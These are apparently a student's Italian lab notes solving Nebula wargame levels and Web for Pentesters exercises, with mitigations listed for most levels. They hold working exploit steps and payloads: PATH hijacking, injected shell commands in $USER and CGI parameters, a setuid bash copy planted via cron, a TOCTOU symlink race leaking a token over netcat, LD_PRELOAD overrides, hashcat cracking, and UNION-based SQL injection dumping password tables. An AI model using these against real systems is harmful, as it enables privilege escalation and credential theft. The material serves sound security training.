# Esercizi di laboratorio:  

<center>

# Nebula 

</center>


## Level00:
tbd

## Level01:

Il comando echo dentro l'eseguibile è eseguito tramite il comando env, che consente di eseguire un comando esterno in un ambiente UNIX.  

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/usr/bin/env echo and now what?");
}
```

Si vuole arrivare ad eseguire il binario `/home/flag01` con i permessi di flag01.  
Il binario flag01 ha `SETUID` attivo e echo non viene invocato con un path completo, il che permette una comand injection.  

**Exploit:** Si copia getflag come /tmp/echo e si prepone la directory /tmp a `$PATH` che contiene i percorsi di ricerca dei binari. In questo modo quando si invocherà 'echo' verra eseguito /tmp/echo che contiene la copia di getflag, quindi verrà eseguito getflag.  


```bash
# echo $PATH contiene percorso ricerca UNIX dei binari 
# si modifica PATH prependendo la directory /tmp
export PATH=/tmp:$PATH
echo $PATH # mostra /tmp come prima dir di ricerca

# Si copia il file /bin/getflag in /tmp/echo 
cp /bin/getflag /tmp/echo # ora env echo invoca getflag

cd /home/flag01
./flag01 # invoca getflag con i privilegi di getflag!
```

**Mitigazioni:**  
- Si usa il percorso intero di echo ossia `/bin/echo` per evitare injection tramite PATH
- Rimuovere il SETUID da flag01 per impedire esecuzione privilegiata 
- Cambiare il contenuto di PATH usano le funzioni `setenv` o `getenv` nel codice sorgente e ripristinandole dopo l'invocazione, richiede una nuova compilazione del binario.  


## Level02: 

È presente un eseguibile in `/home/flag02`, ha SETUID attivo ed è presente l'utilizzo di una variabile di ambiente non controllata `$USER`.  

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
Usiamo una comand injection con la seguente struttura: comando_safe + carattere separatore + comando_malizioso + commento. 
Inseriamo dentro la variabile $USER l'output che si aspetta, ossia level02 e poi con il carattere seperaratore `;` iniettiamo il comando `getflag` che verrà eseguito con i privilegi elevati in quanto il binario ha SETUID attivo.  

```bash
echo $USER # stampa valore corrente ossia: level02
# si imposta l input malizioso in USER con export 
export USER="level02; getflag #"
echo $USER # otteniamo level02; getflag #
cd /home/flag02
./flag02 # esegue getflag con i permessi fi flag02 in quanto il binario ha setuid attivo
```

**Mitigazioni**:
- Abbassiamo i privilegi al binario
- Usiamo il comando `getpwuid()` per ottenere il nome dell'user da /etc/passwd invece di usare una variabile modificabile dall'utente.  



## Level03: 
In questo esercizio è presente un daemon cronotab che esegue ogni minuto, per verificarne la presenza si può fare `pstree -p`.  
Studiando la directory di flag03 si scopre che contiene un file sh che prova ad eseguire il contenuto della directory `writable.d` che è world-writable (drwxrwxrwx) ossia un'eccessiva esposizione dell'asset.  
Il cronotab periodicamente eseguirà il file `writable.sh` e quindi andrà ad eseguire tutti i file di writable.d.  

**exploit:** L'obiettivo è sfruttare il cronotab che esegue con i permessi di flag03, infatti inseriremo dentro writable.d che ha permessi abilitati per tutti uno script bash che copi /bin/bash lì e che gli assegni i SETUID e SETGID per eseguire con i privilegi di flag03; Il cronotab quando si attiverà eseguirà `writable.sh` che eseguirà a sua volta i file bash in `writable.d`.  

```bash
# in: /home/flag03/writable.d/exploit.sh 

#!/bin/bash
cp /bin/bash /home/flag03/bash 
chmod u+s /home/flag03/bash 
```

Quando questo file verrà eseguito in /home/flag avremo una copia di bash, basterà eseguire bash con l'opzione -p per non perdere i privilegi e una volta entrati eseguiremo getflag

```bash
level03@nebula: /home/flag03$ ls 
bash  writable.d  writable.sh
level03@nebula: /home/flag03$ /home/flag03/bash -p
bash-4.2$ whoami 
flag03
bash-4.2$ getflag
You have successfully executed getflag on a target account
```

**Mitigazioni:**  
- Restringere i permessi di accesso a writable.d 
- Restringere accesso alla home di flag03 rendendola accessibile solo a flag03 

<br>

## Level05:

Andando su /home/flag05 si scopre un file .backup che contiene una coppia di chiavi per una connessione ssh per connettersi alla VM con l'account flag05.
```bash
ssh -p 2222 -o PublicAcceptedKeyTypes=+ssh-rsa-i .ssh/id_rsa flag05@localhost
```

**Mitigazioni:**  
- Abbassare privilegi di accesso e negare l'accesso a tutti tranne che all'utente propriertario della directory 
- Rimuovere file contenenti dati sensibili di un sistema 

<br>

 

## Level06

Si informa che il sistema proviene da una distribuzione legacy di linux e che potrebbe avere problemi di sicurezza.  
Infatti in questo sistema tutti possono leggere `/etc/passwd`, leggendo tale file ci si accorge che l'hash della password dello user flag06 è salvato in chiaro.  

Basta copiare l'hash e decriptarlo per ottenere la password dell'utente.  
Per prima cosa serve capire il tipo di hash $\rightarrow$ `hashid` 
- `-m` per includere la modalità da usare con hashcat . corrisponde a 1500
- dopo si usa hashcat con attaco a dizionario usando `rockyou` reperibile online 
- usare opzione `hashcat -a 0 -m 1500 flag06.hash rockyou.txt` per attacco a dizionario 
- usare `--show` per stampare il risultato 

**Mitigazioni:**  
- Un amministratore di sistema dovrebberimuovere l'hash in bella visa da /etc/passwd e metterlo in /etc/shadow per evitare che sia esposto.  

<br>

  


## Level07:

È presente un programma perl che esegue un ping verso un indirizzo passato nella variabile $host, l'obiettivo è eseguire getflag con flag07.  

Si naviga in /home/flag07 e si trova il codice sorgente e il file di configurazione (scopriamo in ascolto sulla porta TCP 7007; in esecuzione con privilegi flag07 e servente la directory /home/flag07).  


```php
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```


Vulnerabilità $\rightarrow$ Input non controllato nel sorgente  
Si farà una command injection che permetta di eseguire il comando getflag 

Per aprire la connessione si può scrivere la richiesta GET e passarla a netcat tramite pipe $\rightarrow$ `echo "GET /index.cgi?Host=8.8.8.8"| nc localhost 7007`  

Se si prova ad usare una command injection con carattere `;` come separatore questa fallirà in quanto `;` è un carattere speciale che viene interpretato e rimosso dall'url.  
Per iniettare il comando bisogna usare la codifica ascii di `;` e per fare escaping di un carattere in ambito web si usa il carattere `%`, alla fine il separatore sarà `%3b`.  

Injection $\rightarrow$ `echo "/index.cgi?Host=8.8.8.8%3Bgetflag" | nc localhost 7007"`  

note:
- si potrebbe anche usare `echo -ne "GET /index.cgi?Host=8.8.8.8%3Bgetflag\r\n\r\n" | nc localhost 7007` ma bisogna chiudere i header HTTP con \r\n\r\n  
- Quando scriviamo la injection non lasciare spazi e tenere tutto attaccato.  

**Mitigazioni:**  
- Abbassare i privilegicambiano dile di configurazione per impedire esecuzione di getflag
- Filtrare e Sanificare l'input per evitare iniezzioni.  


<br>

## Level08:  

serve wireshark.  




## Level10: 

È presente un binario che prende in input il path di file e un indirizzo IP che apre una connessione verso un client se dispone dei permessi.  
Osservando il sorgente si nota una notevole distanza tra il controllo dell'accessibilità del file e l'effettivo utilizzo (nel mezzo ci sono operazioni costose - flush di stdout).  
È presente anche un file `token` che contiene le credenziali di autenticazione di `flag10`  

Vulnerabilità: 
- toctou: distanza controllo uso eccessiva
- il file in input non è controllato o sanitizzato prima dell'utilizzo
- privilegi eccessivamente elevati dati dalla presenza del SETUID all'eseguibile  


Vogliamo ingannare il programma facendo in modo che al Time-of-Check il file sia uno a cui abbiamo accesso (altrimenti non eseguirebbe), e durante la Finestra di Opportunità sostituirlo con un file a cui non avremmo accesso (`token`), in modo che al Time-of-Use il programma apra il file sbagliato con i privilegi elevati.

Bisognerà: 
- creare un link che alterna tra i due file: uno di cui si può leggere il contenuto e l'altro il file `token` 
- creare un client che accetti la connessione aperta dal programma riflettendo il contenuto su un file
- eseguire il binario rallentando l'esecuzione al massimo  

La sostituzione di asset avviene con un ciclo che crea continuamente un link alternando tra un file di cui si disponde dei permessi di accesso (creato appositamente) e il file obiettivo `token`. 

Sul primo terminale si lancia il seguente comdando:

```bash
while :; do ln -fs /tmp/token /tmp/link; ln -fs /home/flag10/token /tmp/link; done  
```
- opzione `-f` forza il link anche se il file esiste già ; `-s` crea link simbolico  


Sul secondo terminale si collega il clinet con netcat:

```bash
while :; do nc.traditional -vlp 18211 >> /tmp/server.txt; done 
```
- questo ciclo server per resilienza, dato che si proveranno migliaia di tentativi e sapendo che ad ogni tentativo fallito il server si chiude, lo inseriamo in un ciclo infinito per assicurarci che il server rimanga sempre in ascolto


L'esecuzione del binario avviene dentro un ciclo while ma si sfrutta il comando `nice` per modificare lo scheduling del programma e rallentarlo.    

Nel terzo terminale:
```bash
while :; do nice -n 19 /home/flag10/flag10 /tmp/link 127.0.0.1; done 
```
- si specifica l'eseguibile + file partenza + indirizzo ip del server
- per natura dell'attacco questo va eseguito in un ciclo infinito per cercare di fare vincere al linker la corsa critica.  


Per verificare l'andamento dell'exploit si può usare `tail` per stampare le ultime righe a /tmp/server.txt e rimuovere le connessioni con `grep`  

Nel quarto terminale scriviamo:  
```bash
tail -f /tmp/server.txt | grep -v '.oO Oo.'
```

In questo terminael troveremo la password di flag10, basterà poi fare `su flag10` > inserire la password ottenuta > eseguire getflag con tale account.  


## Level13:

Nella home directory di flag13 è presente un binario che controlla lo userID dell'utente che lancia il processo, se corrisponde al valore predeterminato allora si stampa il token - password di flag13.  

La vulnerabilità sta nello script, viene stampato in caso di fallimento l'id dell'utente che ha lanciato il processo e l'ID che si aspettava l'eseguibile, questo fa diventare il fattore di autenticazione pubblico.  
Per aggirare il controllo e 'sovrascrivere' la funzione `getuid` si consulta la documentazione man 7 environ.  

Si scopre che esistono variabili di sistema che possono influenzare il comportamento del linker.  

Iniezione di libreria: si sfrutta la variabile di ambiente `LD_LIBRARY_PATH` - `LD_PRELOAD`.  

Scopriamo che `LD_PRELOAD` contiene un elenco di librerire condivise e tali librerie sono collegate prima di tutte le altre richieste da un file binario eseguibile (LD_PRELOAD =/path/to/lib.so:/path2/...).  
Attenzione: questa vulnerabilità funziona solo per file compilati dinamicamente in quanto server l'iniezione di libreria, se è statico allora non si può sfruttare questo exploit.  

Step: 
1. generare libreria condivisa che sovrascrive la funzione getuid(), facciamo ritornare sempre 1000 
    andiamo su man getuid per capire quali librerie servono per poter fare l'override della funzione
2. compilare la libreria con -shared e -fPIC 
3. copiare l'eseguibile da /home/flag13/flag13 in /home/level13 per rimuovere il setuid (in quanto una libreria condivisa funziona solo se ha lo stesso tipo di privilegio del binario)  
4. iniettare la libreria: export LD_PRELOAD = ./setuid.so
5. ottenre credenziali 

```c++
// si scrive un eseguibile in c per sovrascrivere la funzione getuid:
uid_t getuid(void){
    return 1000;
}
```
```bash
# generiamo libreria condivisa con gcc
gcc -shared -fPIC -o getuid.so getuid.c 
export LD_PRELOAD=./getuid.so 
# copiamo il file eseguibile nella directory attuale per eliminare il setuid da esso
cp /home/flag13/flag13 /home/level13

# eseguiamo il file
./flag13 # -> otteniamo la password per flag13 (su flag13)
```

Volendo per evitare di cambiare l'ambiente per l'intera sessione si può fare in questo modo:

```bash
gcc -shared -fPIC -o getuid.so getuid.c 
cp /home/flag13/flag13 /home/level13

export LD_PRELOAD=./getuid.so ./flag13 
```
In questo modo una volta finito l'eseguibile flag13 l'export si perde e torna ad essere normale per evitare di interferire con altri binari.  



### Protostar 
- stack 01 
- stack 03
- stack 05:  
    Si consulta il codice sorgente per la challenge e si nota che viene allocato un buffer di 64 caratteri sullo stack e successivamente viene riempito tale buffer con dati letti da terminale, tale input non è controllato (recipe for disaster).  
    La modalità per affrontare l'esercizio è in #riassunto.md nel heading `Buffer Overflow`.  
- stack 06:  


    ```bash

    ```



### Web4PenTesters
- Code Injection 1:
    Si guarda il codice sorgente in `/var/www/codeexec` e si nota che viene usata una stringa $str = 'echo...' e che tale stringa viene interpretata come una espressione php.  
    Si usa lo schema di attacco generico: 
    ``` 
    INPUT = input legittimo +  
            carattere separatore codice +  
            codice php arbitrario  +  
            carattere chiusura.  
    ```

    ```bash
    # useremo la seguente struttura per visualizzare i privilegi:
    name = hacker \" +
        + ; 
        + system("id");
        + \" 

    # andremo a scrivere nell\'url il seguente input:
    ...example1.php/name=hacker";system("id");"
    ```
    Questo ci permetterà di chiamare ID e vedere gli uid e gid 
- XSS 1 
- File include 1 


## SQL Injections:

- SQL Injection 1:  
    Nel codice sorgente della sfida notiamo che viene costruita una stringa rappresentante uno statement SQL, tale input non viene controllato in alcun modo e viene mandato ad un DBMS MySQL per l'esecuzione.  
    Si adotta lo schema classico di iniezione al caso specifico.  
    È possibile usare l'operatore **`OR`** per iniettare un comando e l'espressione in questo modo diventa una _tautologia_

    ```bash
    # tautologia
    .../example1.php/name=root 'or 1=1%23 '#

    # clausola SELECT e ORDER BY (per determinare il numero di colonne)  
    .../exmaple1.php/name=root' UNION SELECT NULL,NULL,NULL,NULL,NULL%23 '#
    # oppure 
    .../exmaple1.php/name=root' ORDER BY 6 %23 '# genera un errore allora capisco che si tratta di 5 colonne, infatti:
    .../exmaple1.php/name=root' ORDER BY 5 %23 # non genera errore ! '#
    ```

    Una volta determinato il numero di colonne riesco a eseguire Query omogenee, a questo punto posso enumerare il db e ottenere il suo nome per avanzare nella SQL injection:

    - `root' UNION SELECT version(), database(), current_user(),4,5 %23`

    A questo punto ottengo il nome del DB ossia **exercises**

    Per estrarre le tabelle interessanti del DB devo iniettare il comando `information_schema.tables` tramite una UNION.  

    - `root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables where table_schema='exercises'%23`  
    Noto che il db exercises ha una sola tabella di nome `users`  

    Faccio la stessa cosa ma per vedere la struttura della colonne  
    - `root' UNION SELECT column_name,2,3,4,5 from information_schema.columns where table_schema ='exercises and table_name='users' %23`
    Noto che la tabella users ha 5 colonne: id, name, age, groupid, passwd  

    A questo punto posso fare il dump della tabella, basta uno statement SELECT che selezioni le colonne interessanti (id,name,passwd) della tabella di interessa (users)

    - `root' UNION SELECT id,name,passwd,4,5 from users %23`

    ![result sql injection 1](../../images/sql_inj_result1.png)  

    **nota:** Se si è a corto di colonne riflesse si può usare la funzione di sistema `concat()` per concatenare valori di colonne diverse.  

    - `root' UNION SELECT concat(id,':',name,':',passwd),2,3,4,5 from users %23`  
    In questo modo l'ouput interessante ora è compattato in un unica colonna.  
    
- SQL injection 2:  


    ```bash
    ```

